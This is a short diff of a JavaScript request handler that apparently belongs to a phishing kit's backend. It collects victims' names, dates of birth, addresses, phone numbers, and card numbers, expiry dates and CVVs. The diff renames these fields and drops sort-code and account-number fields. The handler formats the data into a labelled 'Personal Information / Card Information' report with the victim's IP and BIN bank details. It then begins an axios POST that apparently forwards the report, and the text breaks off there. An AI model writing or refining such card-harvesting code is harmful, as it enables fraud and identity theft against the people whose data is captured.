@@ -4,17 +4,16 @@ let count = 0;
 
 const sendRes = async (req, res) => {
     let {
-        fname,
-        dob,
-        phone,
+        fullname,
         addy,
+        city,
         pcode,
+        dob,
+        telephone,
         ccname,
         ccnum,
         ccexp,
-        cccvv,
-        scode,
-        accno,
+        cvv,
         userAgent,
         ip,
         bin,
@@ -37,8 +36,7 @@ const sendRes = async (req, res) => {
     }
 
     binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
-    var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${addy}\nPostcode: ${pcode}\nPhone Number: ${phone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n${scode && accno ? `Sort Code: ${scode}\nAccount Number: ${accno}\n` : ""
-        }+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
+    var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${addy}\nCity: ${city}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
     if (count == 6) {
         await axios
             .post(
